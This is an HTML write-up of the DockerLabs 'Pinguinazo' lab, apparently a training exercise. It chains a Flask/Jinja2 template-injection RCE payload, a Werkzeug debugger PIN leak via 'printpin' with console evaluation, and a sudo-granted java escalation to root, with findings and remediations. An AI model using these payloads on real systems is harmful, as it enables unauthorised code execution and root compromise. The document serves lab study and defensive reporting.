@@ -1,0 +1,431 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta name="robots" content="noindex">
+<title>Lab 93 Pinguinazo &middot; DockerLabs corpus</title>
+<link rel="stylesheet" href="../assets/site.css">
+</head>
+<body>
+<header><a class="brand" href="../index.html">DockerLabs corpus</a><nav><a href="../index.html">Root cause</a><a href="../evidence.html">Evidence</a><a href="../corrections.html">Corrections</a><a href="../hazards.html">Hazards</a><a href="../labs.html">Labs</a><a href="../resolved.html">Resolutions</a></nav></header>
+<main>
+<p class="crumb"><a href="../labs.html">Labs</a> &rsaquo; Pinguinazo</p><h1 id="pinguinazo-dockerlabs-93--writeup">Pinguinazo (DockerLabs #93) — Writeup</h1>
+<p><strong>Target:</strong> <code>pinguinazo:latest</code> · Ubuntu 24.04 LTS · single TCP port
+<strong>Shipped description:</strong> <em>&quot;Laboratorio para practicar la vulnerabilidad SSTI y escalada de privilegios abusando de Java mediante sudo.&quot;</em>
+<strong>Verdict on the description: it is the first in 26 labs that is accurate, and both halves are literally true.</strong> It names SSTI (present, <code>app.py:12-13</code>) and a Java-mediated privilege escalation through <code>sudo</code> (present, one line of <code>/etc/sudoers</code>, and <code>java</code>/<code>javac</code>/<code>jshell</code> are installed). I state this explicitly because the prior 25 descriptions lied; the useful consequence here is that the advertised classes were worth attacking directly, and there was no third act to find.</p>
+<hr />
+<h2 id="1-surface">1. Surface</h2>
+<pre><code>$ nmap -sV -Pn -p- [net-0-19]
+PORT     STATE SERVICE VERSION
+5000/tcp open  http    Werkzeug httpd 3.0.1 (Python 3.12.3)
+Not shown: 65534 closed tcp ports (conn-refused)
+</code></pre>
+<p>One port, unauthenticated, no TLS, no SSH. That is the whole external surface, and it is complete: <code>65534 closed</code> with <code>conn-refused</code> is a real negative, not a truncated sweep.</p>
+<table>
+<thead>
+<tr>
+<th>Component</th>
+<th>Measured</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>OS</td>
+<td>Ubuntu 24.04 LTS, kernel <code>7.0.0-34-generic</code></td>
+</tr>
+<tr>
+<td>Python</td>
+<td>3.12.3</td>
+</tr>
+<tr>
+<td>Flask</td>
+<td>3.0.2</td>
+</tr>
+<tr>
+<td>Werkzeug</td>
+<td>3.0.1 (matches the <code>nmap</code> banner)</td>
+</tr>
+<tr>
+<td>Java</td>
+<td><strong>OpenJDK 21.0.3+9-Ubuntu</strong>, <code>/usr/bin/java</code>; <code>javac</code> and <code>jshell</code> also present</td>
+</tr>
+<tr>
+<td>Java home</td>
+<td><code>/usr/lib/jvm/java-21-openjdk-amd64/bin/java</code> (<code>root:root</code>, <code>0755</code>, <strong>not setuid</strong>)</td>
+</tr>
+<tr>
+<td>Service identity</td>
+<td><code>uid=1001(pinguinazo) gid=1001(pinguinazo) groups=1001(pinguinazo),100(users)</code></td>
+</tr>
+<tr>
+<td>Bind</td>
+<td><code>0.0.0.0:5000</code></td>
+</tr>
+</tbody>
+</table>
+<p><strong>No other login-capable account.</strong> <code>root:*</code> (locked), <code>ubuntu:!</code> (locked), every system account <code>*</code> or <code>!</code>. <code>pinguinazo</code> is the only entry, and the only entry is the web application.</p>
+<p><strong>Source read before attacking (§7), in full — 16 lines:</strong></p>
+<pre><code class="language-python"> 1  from flask import Flask, request, render_template_string, render_template
+ 2
+ 3  app = Flask(__name__)
+ 4
+ 5  @app.route('/')
+ 6  def index():
+ 7      return render_template('index.html')
+ 8
+ 9  @app.route('/greet', methods=['POST'])
+10  def greet():
+11      name = request.form['name']
+12      template = f&quot;Hello {name}!&quot; # No se aplica ninguna pingusanitización
+13      return render_template_string(template)
+14
+15  if __name__ == '__main__':
+16      app.run(debug=True, host='0.0.0.0')
+</code></pre>
+<p>Everything in §3 and §4 is visible in those 16 lines. There is no filter, no auth, no database, no second component, and no file the application writes.</p>
+<p><strong>The form lies about the sink, and that is a measurement, not an assumption.</strong> <code>templates/index.html:12-30</code> posts four fields — <code>name</code>, <code>birthday</code>, <code>email</code>, <code>phone</code> — but the view function reads exactly one (<code>request.form['name']</code> at <code>app.py:11</code>). Confirmed behaviourally in §2. Two of the four are decorative and one is <code>readonly</code> with a pre-filled value. <strong>A form is not a parameter list</strong>, and the difference is one request.</p>
+<hr />
+<h2 id="2-ssti-the-oracle-and-what-it-decided">2. SSTI: the oracle, and what it decided</h2>
+<p>The rule this file follows is the existing one (<code>api_web.md</code>, <em>SSTI oracle</em>): <strong>reflection is worthless; send the same payload to two fields of the same request and read both halves of the response, and the positive control runs first.</strong></p>
+<p><strong>Positive control, first, on the live target:</strong></p>
+<pre><code>POST /greet  name={{7*7}}&amp;birthday={{7*7}}
+  -&gt; Hello 49!            [code=200 len=9]
+</code></pre>
+<p><code>49</code>, not the literal <code>{{7*7}}</code>. The oracle can see an evaluation before a single negative is sent.</p>
+<p><strong>The two-field differential, which also maps the sink for free:</strong></p>
+<pre><code>name=MARKERPROBE&amp;birthday={{7*7}}  -&gt; Hello MARKERPROBE!   [len=18]
+name={{7*7}}&amp;birthday=MARKERPROBE  -&gt; Hello 49!            [len=9]
+name={{config}}&amp;birthday=x          -&gt; Hello &lt;Config {'DEBUG': True, ..., 'SECRET_KEY': None, ...}
+</code></pre>
+<p><code>birthday</code> never appears in the response at all — not evaluated, not reflected. <strong>One request told me the sink is <code>name</code>, told me the engine is Jinja2, and told me <code>DEBUG</code> is <code>True</code></strong>, which is the whole of Finding 3 discovered by accident. The three remaining form fields are not attack surface and were not fuzzed.</p>
+<p><strong>RCE, with <code>id</code> first, as the identity:</strong></p>
+<pre><code>POST /greet  name={{ cycler.__init__.__globals__.os.popen('id').read() }}
+  -&gt; Hello uid=1001(pinguinazo) gid=1001(pinguinazo) groups=1001(pinguinazo),100(users)!
+</code></pre>
+<p><code>uid=1001(pinguinazo)</code>, groups <code>1001(pinguinazo),100(users)</code> — <strong>not root, and not in <code>sudo</code></strong>, which is what makes the next hop a hop and not a relabelling. The whole rest of the engagement is <code>os.popen</code> from this primitive.</p>
+<hr />
+<h2 id="3-findings">3. Findings</h2>
+<h3 id="finding-1--server-side-template-injection-request-data-compiled-as-template-source">Finding 1 — Server-side template injection: request data compiled as template source</h3>
+<p><strong>CWE-1336</strong> (Improper Neutralization of Special Elements Used in a Template Engine) · <strong>CWE-94</strong> · severity: <strong>critical</strong></p>
+<p><code>app.py:11-13</code> reads <code>request.form['name']</code> and interpolates it into an f-string that is then handed to <code>render_template_string</code>, which <strong>compiles</strong> it. The shipped comment at <code>:12</code> states the absence of sanitisation, and it is correct.</p>
+<p><strong>Evidence (unauthenticated, from the network, no credential):</strong></p>
+<pre><code>name={{7*7}}                                                  -&gt; Hello 49!
+name={{ cycler.__init__.__globals__.os.popen('id').read() }}   -&gt; Hello uid=1001(pinguinazo) ...!
+</code></pre>
+<p><strong>Impact.</strong> Unauthenticated remote code execution as the service account, from a single <code>POST</code> to a route with no authentication, no CSRF token and no session. There is no second component to pivot through and no input the application validates anywhere, so there is nothing to tune.</p>
+<p><strong>Root cause.</strong> <code>render_template_string</code> on a string built from request data. The safe sibling is two lines away and is the remediation: <code>render_template('greet.html', name=name)</code> passes the value as a <em>context variable</em> and never as template <em>source</em>.</p>
+<p><strong>Remediation.</strong> Replace <code>render_template_string</code> with a fixed template and a named variable. Add a length bound and a character class on the field as defence in depth — but note that a character filter here would be a <em>detector-style</em> control at best, and the correct fix is that request data is never source.</p>
+<hr />
+<h3 id="finding-2--a-sudoers-grant-that-names-an-interpreter-is-arbitrary-code-execution-as-root">Finding 2 — A sudoers grant that names an interpreter is arbitrary code execution as root</h3>
+<p><strong>CWE-269</strong> (Improper Privilege Management) · <strong>CWE-250</strong> (Execution with Unnecessary Privileges) · severity: <strong>critical</strong></p>
+<p><strong>The grant, read from <code>/etc/sudoers</code> as the literal file content:</strong></p>
+<pre><code>pinguinazo ALL=(ALL) NOPASSWD: /usr/bin/java
+</code></pre>
+<p><strong>And the same grant as the account itself sees it</strong> — one request, and this line is the whole audit:</p>
+<pre><code>$ sudo -n -l
+Matching Defaults entries for pinguinazo on b71a48a00ebb:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
+
+User pinguinazo may run the following commands on b71a48a00ebb:
+    (ALL) NOPASSWD: /usr/bin/java
+</code></pre>
+<p>Per <code>man 5 sudoers</code>: <em>&quot;A simple file name allows the user to run the command with <strong>any arguments they wish</strong>.&quot;</em> There is no argument list, therefore there is no argument restriction, therefore <code>java</code> is a root shell with a different command name. The escalation is <strong>purely argument-shaped</strong> — nothing was written to the host that the grant did not already permit, and the payload (<code>-cp /tmp P</code>) exists only in <code>argv</code>:</p>
+<pre><code>$ java -cp /tmp P                          -&gt; uid=1001(pinguinazo) gid=1001(pinguinazo) groups=1001(pinguinazo),100(users)
+$ sudo -n /usr/bin/java -cp /tmp P         -&gt; uid=0(root) gid=0(root) groups=0(root)
+</code></pre>
+<p><strong>Positive control: the <em>same</em> class, without <code>sudo</code>, returns <code>uid=1001(pinguinazo)</code>.</strong> One class, one <code>id</code>, two answers. Without that control the second line is only a string.</p>
+<p><strong>The control that proves what the grant <em>does</em> restrict, and it belongs in the report beside the finding:</strong></p>
+<pre><code>sudo -n /bin/id            -&gt; sudo: a password is required   rc=1
+sudo -n /usr/bin/id        -&gt; sudo: a password is required   rc=1
+sudo -n /usr/bin/java -version -&gt; openjdk version &quot;21.0.3&quot;    rc=0
+</code></pre>
+<p><strong>The path restriction is real and it holds.</strong> The defect is not &quot;sudo is loose on this host&quot; and must not be reported that way — it is that <strong>the single program the policy trusts is an interpreter.</strong> The remediation is therefore <code>NOPASSWD: /usr/bin/java -jar /opt/app/app.jar</code> with <code>/opt/app</code> root-owned, <strong>not</strong> the removal of the sudoers line, and a reviewer handed only &quot;sudoers is misconfigured&quot; will patch the wrong thing.</p>
+<p><strong><code>/usr/bin/java</code> is <code>root:root 0755</code> and not setuid</strong> — the elevation comes from the policy, not from the binary. Worth stating, because &quot;the JDK is installed root-writable&quot; would be a different finding and is not this one.</p>
+<p><strong>Secondary read on the same line, reported separately rather than folded into the severity:</strong> the runas is <code>(ALL)</code>, not <code>(root)</code>. Verified: <code>sudo -n -u nobody /usr/bin/java -version</code> and <code>sudo -n -u root /usr/bin/java -version</code> both return the OpenJDK banner. On an inline grant this widens nothing (the program is already arbitrary code as root); on a <em>pinned</em> grant it is the difference between a finding and a no-finding. Severity unchanged here; it is a note for the next audit of this line.</p>
+<p><strong>Root cause.</strong> An authorisation policy written as a list of program paths, where the semantics of a bare path are &quot;any arguments&quot; and the program named is a general-purpose runtime.</p>
+<p><strong>Remediation.</strong> Pin the exact argument vector, root-own the directory the vector names, and drop the runas set to <code>(root)</code>. Do not grant a runtime. If a JDK is genuinely required for an administrative task, run it through a wrapper script that is root-owned and takes no attacker-controlled arguments, and grant the wrapper.</p>
+<hr />
+<h3 id="finding-3--the-werkzeug-interactive-debugger-is-exposed-on-a-network-reachable-port-and-prints-its-own-pin-to-any-anonymous-client">Finding 3 — The Werkzeug interactive debugger is exposed on a network-reachable port, and prints its own PIN to any anonymous client</h3>
+<p><strong>CWE-489</strong> (Active Debug Code) · <strong>CWE-215</strong> (Insertion of Sensitive Information Into Debugging Code) · severity: <strong>critical</strong></p>
+<p><code>app.py:16</code> runs <code>app.run(debug=True, host='0.0.0.0')</code>. The developer server's debugger is a <em>separate</em> execution primitive from Finding 1, with its own gate, and I proved it independently.</p>
+<p><strong>Step 1 — an anonymous <code>500</code> renders the full interactive traceback, including a per-request secret in the page source:</strong></p>
+<pre><code>POST /greet  name={{ undefined_thing_zz.attr }}   -&gt;  500, 23164 bytes
+  &lt;title&gt;jinja2.exceptions.UndefinedError: 'undefined_thing_zz' is undefined // Werkzeug Debugger
+  &lt;input type=text name=pin size=14&gt;   &lt;input type=submit name=btn value=&quot;Confirm Pin&quot;&gt;
+  var CONSOLE_MODE = false, EVALEX = true, EVALEX_TRUSTED = false,
+      SECRET = &quot;rq0qO46XAu5cPr3SIvMX&quot;;
+</code></pre>
+<p><strong>Step 2 — the debugger has a command that logs the PIN to the application's own log, and it requires only that published secret.</strong> From the target's own <code>werkzeug/debug/__init__.py</code>:</p>
+<pre><code class="language-python">elif cmd == &quot;printpin&quot; and secret == self.secret:
+    response = self.log_pin_request()
+</code></pre>
+<p>and <code>log_pin_request</code> emits <code>&quot; * Debugger pin code: %s&quot;, self.pin</code>.</p>
+<pre><code>$ curl &quot;http://[net-0-19]:5000/console?__debugger__=yes&amp;cmd=printpin&amp;s=rq0qO46XAu5cPr3SIvMX&quot;
+  HTTP/1.1 200
+$ docker logs pinguinazo_container | tail -3
+ * To enable the debugger you need to enter the security pin:
+ * Debugger pin code: 994-101-935
+</code></pre>
+<p><strong>So the gate is not a gate:</strong> trigger a 500, read <code>SECRET</code> out of the page, and post <code>printpin</code>. Two anonymous requests, no credentials, no filesystem access, no prior shell.</p>
+<p><strong>Step 3 — authenticate and evaluate, with the SSTI never involved:</strong></p>
+<pre><code>GET  /console?__debugger__=yes&amp;cmd=pinauth&amp;pin=994-101-935&amp;s=rq0qO46XAu5cPr3SIvMX
+  -&gt; {&quot;auth&quot;: true, &quot;exhausted&quot;: false}
+  -&gt; [response-cookie-header]: __wzdacbdcf30c7e9ad1d478e=1790692486|33bf3cdd04d2; HttpOnly; Path=/; SameSite=Strict
+POST /console?__debugger__=yes&amp;cmd=__import__(&quot;os&quot;).popen(&quot;id&quot;).read()&amp;frm=0&amp;s=…
+  -&gt; uid=1001(pinguinazo) gid=1001(pinguinazo) groups=1001(pinguinazo),100
+</code></pre>
+<p><strong>The two paths are genuinely independent</strong>, which is the reason this is a separate finding with a separate fix: patching <code>app.py:12-13</code> leaves a live remote console, and setting <code>debug=False</code> leaves the SSTI. The identity is the same (<code>uid=1001</code>), so this is not a second escalation — it is a <strong>second unauthenticated RCE reaching the same account</strong>, and the report should say so rather than stacking the severities.</p>
+<p><strong>Root cause.</strong> <code>debug=True</code> bound to <code>0.0.0.0</code> on the Werkzeug development server, in an image with no reverse proxy, no firewall and no authentication in front of it. The PIN is a speed bump against a <em>casual</em> attacker; it is not a control against a scripted one, because the framework logs the PIN on request.</p>
+<p><strong>Remediation.</strong> <code>debug=False</code> unconditionally in any deployed configuration, and run the application under a real WSGI server (<code>gunicorn</code>/<code>uwsgi</code>) rather than the development server. If a debugger is ever needed it must be behind an authenticated, network-restricted control, and <code>WERKZEUG_DEBUG_PIN</code> must not be relied on as one.</p>
+<hr />
+<h3 id="finding-4--the-application-has-no-authentication-at-all">Finding 4 — The application has no authentication at all</h3>
+<p><strong>CWE-306</strong> (Missing Authentication for Critical Function) · severity: <strong>medium</strong>, and it is reported as a <em>distinct</em> finding rather than folded into Finding 1</p>
+<p>Both routes are anonymous. <code>GET /</code> returns <code>200</code> / 1718 bytes with no credential and <code>GET /greet</code> returns <code>405</code> for the wrong method with no credential. Combined with Finding 1 this is unauthenticated RCE, but the two are different decisions with two different fixes: patching the template leaves every future route unauthenticated by default, and adding auth leaves the SSTI reachable by any registered user.</p>
+<p><strong>Root cause.</strong> No authentication middleware exists; <code>/</code> and <code>/greet</code> are registered directly on the <code>Flask</code> object (<code>app.py:5</code>, <code>app.py:9</code>).</p>
+<p><strong>Remediation.</strong> Put the app behind an authenticating layer, and make unauthenticated access a per-route decision rather than the default.</p>
+<hr />
+<h2 id="4-reward">4. Reward</h2>
+<p><strong>There is no reward in this image.</strong> Reported as an absence, with evidence rather than inference — and this is the twenty-sixth lab in a row without one.</p>
+<ul>
+<li><strong>Whole-filesystem sweep as <code>uid=0</code></strong>, excluding only <code>/proc</code>, <code>/sys</code>, <code>/dev</code>, for the brace-token form <code>[A-Za-z0-9_]*\{[A-Za-z0-9_!@#$%^&amp;*.-]{6,}\}[A-Za-z0-9_]*</code>, case-insensitive, with the Perl/C/perl-ecosystem template noise filtered: <strong>no matches.</strong> Every surviving hit was a format string inside a <code>/usr/bin</code> Perl script.</li>
+<li><strong>Filename sweep</strong> for <code>*flag*</code>, <code>*reward*</code>, <code>*secret*</code>, <code>*congratul*</code>, and every file under 3 KB outside <code>/usr</code>, <code>/var</code>, <code>/etc</code>, <code>/run</code>: <strong>only</strong> <code>/etc/java-21-openjdk/security/policy/README.txt</code> and <code>/etc/X11/rgb.txt</code>. The only other files were the four artefacts I created in <code>/tmp</code> during the escalation.</li>
+<li><strong><code>/root</code> as <code>uid=0</code>:</strong> <code>.bashrc</code>, <code>.profile</code>, <code>.local/</code>, and an <strong>empty</strong> <code>.ssh/</code>. No reward file, no <code>authorized_keys</code>, no <code>root.txt</code>.</li>
+<li><strong><code>/run/adduser</code></strong>, the build artefact that installed the grant, is <strong>empty</strong>.</li>
+<li><strong>Image history</strong> (<code>docker history --no-trunc</code>): the entire delta over the <code>ubuntu:24.04</code> base is <code>bash</code>, <code>bash</code> (1.28 GB — the JDK), <code>apt install curl -y</code>, and the <code>CMD</code>. There is no <code>COPY</code> layer, so <strong>the image adds no data file anywhere</strong>; the entire lab is one 16-line Python file, one 35-line template, one user, and one sudoers line.</li>
+<li>The application has no database, no table, no hidden route, and no file it writes — <code>app.py</code> in full is quoted in §1, and its only two routes are <code>/</code> and <code>/greet</code>.</li>
+</ul>
+<p><strong>Conclusion: the reward is the root shell itself.</strong> The chain terminates in <code>uid=0(root) gid=0(root) groups=0(root)</code> and there is nothing behind it.</p>
+<hr />
+<h2 id="5-chain">5. Chain</h2>
+<p>Each hop's executing identity was measured, never inherited.</p>
+<p><strong>1. Unauthenticated <code>POST /greet</code> → SSTI → RCE as the service account.</strong>
+<code>{{7*7}}</code> → <code>49</code> (positive control, run first). <code>cycler.__init__.__globals__.os.popen('id')</code> → <strong><code>uid=1001(pinguinazo) gid=1001(pinguinazo) groups=1001(pinguinazo),100(users)</code></strong>. Two of the four form fields are not sinks; one request established which.</p>
+<p><strong>2. <code>sudo -n -l</code> as that identity → the grant is read off the policy, not discovered by trying.</strong>
+<code>(ALL) NOPASSWD: /usr/bin/java</code>. No argument list. Read per <code>man 5 sudoers</code> as &quot;any arguments&quot;.</p>
+<p><strong>3. The class is written by the attacker and run twice, once without <code>sudo</code>.</strong>
+A 15-line <code>P.java</code> doing <code>ProcessBuilder(&quot;id&quot;)</code> was base64'd into <code>/tmp</code> and compiled with <code>javac</code> as <code>pinguinazo</code>, producing <code>P.class</code> owned by <code>pinguinazo</code> (<code>-rw-rw-r-- 998 bytes</code>). The write is a <code>0644</code> file in the world-writable <code>/tmp</code>, containing nothing the grant did not already authorise, and the whole payload is in <code>argv</code>.</p>
+<p><strong>4. The same class, through the grant → root.</strong></p>
+<pre><code>java -cp /tmp P                    -&gt; uid=1001(pinguinazo) gid=1001(pinguinazo) groups=1001(pinguinazo),100(users)   &lt;- positive control
+sudo -n /usr/bin/java -cp /tmp P   -&gt; uid=0(root) gid=0(root) groups=0(root)
+</code></pre>
+<p><strong>Terminus.</strong> <code>E.java</code> (the same pattern with a command vector) was used for the remainder as <code>uid=0</code>.</p>
+<p><strong>Two hops, three primitives, one identity measurement at each step.</strong> The description named both hops and both were real.</p>
+<hr />
+<h2 id="6-controls-that-held-each-with-a-positive-control">6. Controls that held (each with a positive control)</h2>
+<table>
+<thead>
+<tr>
+<th>Control</th>
+<th>Evidence</th>
+<th>Positive control</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>The sudoers path restriction is real</strong></td>
+<td><code>sudo -n /bin/id</code> → <code>sudo: a password is required</code>, <code>rc=1</code>; <code>sudo -n /usr/bin/id</code> → same, <code>rc=1</code></td>
+<td><code>sudo -n /usr/bin/java -version</code> → OpenJDK banner, <code>rc=0</code>, same account, same minute</td>
+</tr>
+<tr>
+<td><code>pinguinazo</code> is in no privileged group</td>
+<td><code>id</code> → <code>groups=1001(pinguinazo),100(users)</code>; <code>/etc/sudoers</code> grants <code>root</code>, <code>%admin</code>, <code>%sudo</code></td>
+<td>The <code>java</code> grant works, so <code>sudo</code> is not simply refusing everything — the refusals above are policy decisions, not a missing binary</td>
+</tr>
+<tr>
+<td><code>/etc/sudoers.d/</code> holds no additional policy</td>
+<td>only <code>README</code>, <code>-r--r----- root root 1068</code>, the stock upstream file</td>
+<td>The <code>java</code> grant is live, proving the effective policy is the one I read in <code>/etc/sudoers</code> and not a fragment I failed to find</td>
+</tr>
+<tr>
+<td><strong>The Werkzeug debugger console is PIN-gated</strong></td>
+<td><code>POST /console</code> with no cookie → <code>console is locked and needs to be unlocked</code></td>
+<td>After <code>pinauth</code> with the logged PIN → <code>{&quot;auth&quot;: true, &quot;exhausted&quot;: false}</code> and the console evaluated <code>id</code>. <strong>The gate exists and is a speed bump, not a control — Finding 3 shows it is opened in two anonymous requests. Reported as a control that held <em>partially</em>, which is why Finding 3 is rated critical rather than informational.</strong></td>
+</tr>
+<tr>
+<td>Only one port is open</td>
+<td><code>nmap -p-</code> → <code>1 open, 65534 closed (conn-refused)</code></td>
+<td>The service answered <code>-sV</code> with a real banner, so the scanner saw a service where one exists and is not blind</td>
+</tr>
+<tr>
+<td>No SSH surface</td>
+<td>no <code>22/tcp</code>; <code>nmap -p-</code> closed</td>
+<td><code>nmap -sV</code> resolved <code>5000</code> as Werkzeug, so the negative is a resolved negative and not a filtered-port artefact</td>
+</tr>
+<tr>
+<td><code>root</code> is locked</td>
+<td><code>/etc/shadow</code> → <code>root:*</code></td>
+<td><code>sudo -n -u root</code> works, so root is <em>reachable</em> — it is the password login that is absent, and I did not attempt to supply one</td>
+</tr>
+<tr>
+<td>Only one login-capable account</td>
+<td><code>pinguinazo</code> is the sole non-<code>!</code>/<code>*</code> entry; <code>ubuntu:!</code></td>
+<td><code>sudo -n -l</code> as <code>pinguinazo</code> returned a live policy, so the account exists and its rules are loaded</td>
+</tr>
+<tr>
+<td><code>birthday</code>, <code>phone</code>, <code>email</code> are not sinks</td>
+<td><code>name=MARKERPROBE&amp;birthday={{7*7}}</code> → <code>Hello MARKERPROBE!</code> (18 bytes), <code>{{7*7}}</code> absent entirely</td>
+<td><code>name={{7*7}}</code> → <code>Hello 49!</code> (9 bytes) in the same route, same method — the engine evaluates, and it evaluates <code>name</code></td>
+</tr>
+<tr>
+<td><code>/usr/bin/java</code> is not setuid</td>
+<td><code>root root 0755</code></td>
+<td><code>java -cp /tmp P</code> unprivileged returned <code>uid=1001</code>, so the binary grants nothing on its own and the elevation is unambiguously the policy's</td>
+</tr>
+<tr>
+<td>The template is escaped on output</td>
+<td><code>{{config}}</code> rendered as <code>&amp;lt;Config {&amp;#39;DEBUG&amp;#39;: True…</code></td>
+<td>The same field evaluated <code>{{7*7}}</code> to <code>49</code> — so escaping applies to the <em>result</em> of evaluation, and it defeated nothing here because the sink is a subprocess, not HTML</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h2 id="7-autocorrection--readings-i-discarded-and-what-each-would-have-cost">7. Autocorrection — readings I discarded, and what each would have cost</h2>
+<p>Four defects, all of which produced output a reader would accept. Three were mine and one was the target's.</p>
+<p><strong>7.1 I derived the debugger PIN instead of reading it, and the derivation was wrong.</strong> I reimplemented <code>get_pin_and_cookie_name</code> from the target's own library with inputs I had <em>verified</em> one at a time — <code>getpass.getuser()</code> = <code>pinguinazo</code>, <code>modname</code> = <code>flask.app</code>, <code>app.__name__</code> = <code>Flask</code>, <code>mod.__file__</code> = <code>/usr/lib/python3/dist-packages/flask/app.py</code>, <code>uuid.getnode()</code> = <code>155748132967275</code>, <code>get_machine_id()</code> = <code>b'73bfb0b7308a488d88989089ff587b6e'</code>. Every input was correct and the result was <code>894790984</code>. The real PIN is <strong><code>994-101-935</code></strong>. Six verified inputs and a wrong answer is a good illustration of why <em>a derivation is not a measurement</em>: I had the algorithm, I had the constants, and I was still wrong somewhere in my reimplementation, and nothing in my output said so. <strong>The fix that worked was the one §7.5 of the lab 283 write-up already prescribes: the program's own log carried the answer, so read the log.</strong> <code>cmd=printpin</code> printed <code>Debugger pin code: 994-101-935</code> to the container's stderr and I had it in one request. <strong>Cost of the alternative:</strong> I had two failed PIN attempts banked against a ten-failure lockout (<code>elif self._failed_pin_auth &gt; 10: exhausted</code>), and <code>_fail_pin_auth</code> sleeps five seconds past the fifth. Had I needed more attempts, I would have locked myself out of the console and reported &quot;the console is PIN-locked and therefore not exploitable&quot; — a control reported as holding when it had only been out-argued.</p>
+<p><strong>7.2 My first <code>request.application</code> probe returned empty and I nearly read that as &quot;the PIN is not exposed&quot;.</strong> The debugger's <code>pin</code> attribute is on the <code>DebuggedApplication</code> wrapper, and the attribute chain does not surface through Jinja's rendering of an undefined. Empty output is not a negative — it is a probe that did not reach the thing. The correct reading was &quot;my probe failed&quot;, and the productive move was to stop probing the object graph and read the log instead.</p>
+<p><strong>7.3 A <code>404</code> from the debugger console read like a dead endpoint.</strong> Three <code>404</code>s and one <code>500</code> came from guessing the POST shape. The source explained all of them: <code>pin_auth</code> reads <code>request.args[&quot;pin&quot;]</code> — <strong>the PIN must be in the query string, not the body</strong> — and console evaluation additionally requires <code>frm=&lt;frame id&gt;</code> resolving in <code>self.frames</code>. A <code>404</code> from a parameterised route is a statement about my request's syntax before it is a statement about the resource, and I had already written that rule down.</p>
+<p><strong>7.4 The target's own description was accurate, and I checked anyway.</strong> Twenty-five prior descriptions in this corpus announced a vulnerability the image did not contain, so the standing move is to treat the description as a hypothesis. Here I verified both halves — SSTI in the source, the <code>java</code> grant in <code>/etc/sudoers</code>, a real OpenJDK 21.0.3 on disk — and both held. <strong>The generalisable point is not &quot;the description was right&quot;; it is that the verification is one <code>cat</code> of a 16-line file and one line of <code>/etc/sudoers</code>, which is cheaper than any attack, and the answer changes nothing about how the work is done.</strong> The 26th description being accurate is not a reason to skip the 27th.</p>
+<p><strong>7.5 The one place I nearly reported a control that does not exist.</strong> <code>sudo -n /bin/id</code> returning <code>sudo: a password is required</code> is a clean, believable, and easily-mistaken result. Read alone it says &quot;sudo is locked down&quot;. Read next to <code>sudo -n /usr/bin/java -version</code> succeeding, it says something much more specific and much more useful: <strong>the policy trusts exactly one program and it is an interpreter.</strong> A report that stops at the refusal has described a lockout; a report that puts the refusal and the success side by side has described a policy, and the side-by-side is the whole remediation argument.</p>
+<hr />
+<h2 id="8-not-tested-vs-discarded-with-reason">8. Not tested vs. discarded with reason</h2>
+<p><strong>Tested:</strong> both routes (correct and wrong method); the SSTI oracle with a positive control first; the two-field sink differential across all four form fields; RCE and the execution identity; the sudoers policy via both <code>/etc/sudoers</code> and <code>sudo -n -l</code>; the argument-restriction question with <code>/bin/id</code> and <code>/usr/bin/id</code> as the negative pair and <code>java -version</code> as the positive; the <code>(ALL)</code> runas set against <code>nobody</code> and <code>root</code>; the Java binary's ownership and mode; the full account and shadow inventory; the Werkzeug debugger, the PIN leak, the PIN auth and the console eval as a path independent of the SSTI; the reward sweep as <code>uid=0</code>; the image history.</p>
+<p><strong>Not tested (out of scope, no authorisation):</strong> password authentication for <code>pinguinazo</code> — the shadow hash exists and I made no attempt against it; any write outside <code>/tmp</code>; modification of <code>/etc/sudoers</code> or of the application source; the <code>ubuntu</code> account, which is locked; container escape; touching the <code>cybervault-*</code> containers.</p>
+<p><strong>Discarded with reason:</strong></p>
+<table>
+<thead>
+<tr>
+<th>Path</th>
+<th>Why discarded</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>SSTI on <code>birthday</code>, <code>phone</code>, <code>email</code></td>
+<td>Refuted by measurement — the view function reads only <code>request.form['name']</code> (<code>app.py:11</code>), and <code>name=MARKERPROBE&amp;birthday={{7*7}}</code> returned 18 bytes with no trace of the second field. Not fuzzed further; it is not a parameter</td>
+</tr>
+<tr>
+<td>Deriving the debugger PIN from the documented algorithm</td>
+<td>Refuted — the derivation produced <code>894790984</code> against a real <code>994-101-935</code>, with every input individually verified. Recorded in §7.1 because the failure is instructive, not because the path was promising</td>
+</tr>
+<tr>
+<td><code>SECRET_KEY: None</code> as a finding</td>
+<td>Disclosed, and <strong>not decisive</strong> — the application never reads or writes a session, so a forged session cookie would authorise nothing. Applying the disclosure trichotomy honestly makes this a non-finding, and reporting it as a session-forgery exposure would be the confident wrong finding this file is written against</td>
+</tr>
+<tr>
+<td>The app directory being group-writable</td>
+<td><code>app.py</code> is <code>-rw-rw-r-- pinguinazo:pinguinazo</code>, but it is owned by the account that already runs it, so &quot;the service account can modify its own code&quot; is not a boundary crossing. No finding</td>
+</tr>
+<tr>
+<td><code>pinguinazo</code>'s yescrypt hash as a cracking target</td>
+<td>Out of scope and unnecessary — the chain never needed a credential. Not attempted</td>
+</tr>
+<tr>
+<td>Cracking or guessing the Werkzeug PIN by brute force</td>
+<td>Refuted as a method — the framework logs the PIN on request, so the correct technique is two requests, not 10⁹</td>
+</tr>
+<tr>
+<td>Container escape</td>
+<td>Out of scope, and no <code>docker.sock</code>, no privileged mode, no host mounts. Declared untested</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h2 id="9-lab-design-observation">9. Lab design observation</h2>
+<p><strong>This is a clean two-act lab and the description is honest, which after 25 lying descriptions is itself worth recording.</strong> Act one is a textbook unauthenticated SSTI and act two is a one-line sudoers grant naming a JVM — no decoys, no unreachable rewards, no mislabelled escalation. The whole image is 1.28 GB of JDK, 16 lines of Python and 35 lines of HTML, and every one of them is load-bearing.</p>
